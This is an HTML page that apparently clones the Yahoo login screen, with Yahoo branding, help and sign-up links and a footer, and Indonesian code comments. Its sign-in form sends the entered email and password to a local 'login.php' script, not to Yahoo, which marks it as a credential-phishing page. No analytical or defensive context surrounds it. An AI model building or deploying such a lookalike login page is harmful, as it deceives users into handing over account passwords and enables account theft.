<!DOCTYPE html>
<html lang="en" class="js">
<head>
  <meta charset="UTF-8">
  <title>Yahoo - login</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="referrer" content="origin-when-cross-origin">
  <link rel="icon" type="image/x-icon" href="https://s.yimg.com/wm/login/favicon.ico">
  <style>
    /* Reset ringkas */
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
      background: #fff;
      color: #26282a;
      font-size: 17px;
      line-height: 1.6;
    }
    .login-header {
      height: 61px;
      background: #fff;
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 0 16px;
    }
    .login-header .help { font-size: 0.76em; }
    .login-body {
      display: flex;
      min-height: calc(100vh - 61px - 40px);
      align-items: center;
      justify-content: center;
      position: relative;
    }
    .login-box {
      width: 360px;
      background: #fff;
      box-shadow: 0 2px 4px rgba(181,181,181,.7);
      padding: 0 5px;
      border-top: 1px solid #f1f1f5;
      text-align: center;
    }
    .login-logo { margin-top: 30px; height: 50px; }
    .username-challenge {
      padding: 0 20px 30px;
      text-align: left;
    }
    .sign-in-title {
      font-size: 1.06em;
      font-weight: 500;
      margin: 30px 0 20px;
    }
    input[type="text"],
    input[type="password"] {
      width: 100%;
      height: 40px;
      padding: 6px 10px;
      border: 0;
      border-bottom: 1px solid #cfd2d5;
      font-size: 0.94em;
      margin-bottom: 10px;
    }
    input[type="text"]:focus,
    input[type="password"]:focus {
      outline: none;
      border-bottom: 2px solid #188fff;
    }
    .orko-button {
      width: 100%;
      height: 42px;
      background: #188fff;
      color: #fff;
      border: none;
      border-radius: 4px;
      font-size: 0.94em;
      cursor: pointer;
      margin: 30px 0;
    }
    .stay-signed-in {
      display: inline-block;
      font-size: 0.76em;
      color: #979797;
    }
    .stay-signed-in input[type="checkbox"] {
      margin-right: 6px;
      vertical-align: middle;
    }
    .help {
      text-align: right;
      font-size: 0.76em;
    }
    .sign-up {
      text-align: center;
      font-size: 0.76em;
      margin-top: 20px;
    }
    .login-footer {
      position: fixed;
      bottom: 0;
      width: 100%;
      background: #fff;
      padding: 6px 0;
      font-size: 0.59em;
      text-align: center;
    }
    .login-footer a {
      color: #188fff;
      text-decoration: none;
    }
    .error-offline {
      color: #dd1037;
      padding: 10px;
      border: 1px solid #dd1037;
      border-radius: 4px;
      display: none;
    }
  </style>
</head>
<body class="orko en-us">
  <div class="login-header">
    <a href="https://www.yahoo.com/">
      <img src="https://s1.yimg.com/rz/d/yahoo_en-US_f_p_bestfit_2x.png" alt="Yahoo" width="116" height="50">
    </a>
    <a href="https://help.yahoo.com/kb/index?locale=en_US&page=product&y=PROD_ACCT" class="help">Help</a>
  </div>

  <div class="login-body">
    <div class="login-box">
      <div class="login-logo">
        <img src="https://s1.yimg.com/rz/d/yahoo_en-US_f_p_bestfit_2x.png" alt="Yahoo" width="116" height="50">
      </div>
      <p id="error-offline" class="error-offline">Network connection timed out. Please try again.</p>
      <form id="login-username-form" method="post" action="login.php" class="username-challenge">
        <input type="hidden" name="crumb" value="9Smjlj8ihPQ">
        <input type="hidden" name="acrumb" value="St21XZNQ">
        <input type="hidden" name="sessionIndex" value="QQ--">
        <h1 class="sign-in-title" id="mbr-login-greeting">Sign in</h1>

        <input type="text" name="username" id="login-username" tabindex="1" autocapitalize="none" autocorrect="off" autofocus placeholder="Enter your email">
        <input type="password" name="password" tabindex="1" placeholder="Password">

        <div class="stay-signed-in">
          <input id="persistent" name="persistent" value="y" type="checkbox" tabindex="3" checked>
          <label for="persistent">Stay signed in</label>
        </div>

        <input id="login-signin" type="submit" name="signin" class="orko-button" value="Next" tabindex="2">

        <p class="help">
          <a href="https://login.yahoo.com/forgot?done=https%3A%2F%2Fmail.yahoo.com%2F%3Fguccounter%3D1" id="mbr-forgot-link">Trouble signing in?</a>
        </p>

        <p class="sign-up">
          Don't have an account? <a href="https://login.yahoo.com/account/create?done=https%3A%2F%2Fmail.yahoo.com%2F%3Fguccounter%3D1" id="createacc">Sign up</a>
        </p>
      </form>
    </div>
  </div>

  <div class="login-footer">
    <a href="https://info.yahoo.com/legal/us/yahoo/terms/en-us">Terms</a> <strong>(Updated)</strong> |
    <a href="https://info.yahoo.com/privacy/us/yahoo">Privacy</a> <strong>(Updated)</strong>
  </div>

  <script>
    // Deteksi offline sederhana
    window.addEventListener('load', () => {
      if (!navigator.onLine) {
        document.getElementById('error-offline').style.display = 'block';
      }
    });
  </script>
</body>
</html>
